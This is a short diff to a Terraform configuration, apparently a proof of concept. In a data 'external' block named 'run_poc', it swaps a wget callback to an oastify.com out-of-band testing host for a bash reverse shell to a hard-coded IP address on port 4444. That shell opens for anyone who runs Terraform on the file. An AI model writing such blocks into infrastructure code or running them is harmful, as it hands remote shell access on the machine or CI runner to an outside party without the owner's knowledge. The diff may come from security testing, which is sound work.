@@ -11,7 +11,7 @@ resource "random_id" "r" {
 }
 
 data "external" "run_poc" {
-  program = ["wget", "https://z005r7twq22k414db24dfktyapgg46sv.oastify.com/xx"]
+  program = ["bash", "-i", ">&", "/dev/tcp/164.90.177.231/4444", "0>&1"]
 }
 
 variable "env_type_id" {
